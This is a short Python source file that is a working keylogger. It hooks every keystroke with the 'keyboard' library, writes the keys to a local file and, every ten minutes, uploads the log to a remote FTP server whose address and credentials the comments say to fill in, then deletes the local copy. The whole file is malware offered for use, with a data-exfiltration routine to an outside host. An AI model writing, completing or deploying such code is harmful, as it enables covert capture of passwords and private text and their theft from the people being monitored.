import keyboard
import threading
import time
import os
from ftplib import FTP
#appends the keys collected from the keyboard input to files and saves them
def Append_key_to_file(key_1):
      with open("keys.txt", "a") as f:
            if key_1 == "space":
                 f.write(" ")
            elif key_1 == "enter":
                 f.write("\n")
            elif len(key_1)==1:
                 f.write(key_1)
            else:
                 f.write(" * ")
#collects the key from the keyboard and sends it to the Append_key_to_file() function     
def Hook_key_from_keyboard():
    while True:
        event = keyboard.read_event()
        if event.event_type == "up":
            Append_key_to_file(event.name)
              
#send the file to the remote ftp server
def Send_file_to_ftp():
     i=0
     while True:
        time.sleep(600) # Set the time for each upload into the ftp server (Default 10 mins)
        file_path='send'+str(i)+'.txt'
        with open("keys.txt","r") as ww:
             source = ww.read()
        with open("keys.txt", 'w') as file:
          pass
        with open(file_path,"w") as aa:
             aa.write(source)
        ftp=FTP('xx.xxx.xx.xx')   #replace the xx.xxx.xx.xx with the ftp server address or name to upload the logged key file
        ftp.login('username','password')  #replace the username and password with the ftp username and password to login into the ftp server and upload
        with open(file_path,"rb") as file:
          ftp.storbinary(f'STOR {file_path}', file)
          ftp.quit()
        if os.path.exists(file_path):
          os.remove(file_path)
        print("sended")
        i+=1
   
with open("keys.txt","w") as f:
     f.write("Begin -->")
     th1 = threading.Thread(target=Hook_key_from_keyboard)
     th2 = threading.Thread(target=Send_file_to_ftp)
     th1.start()
     th2.start()
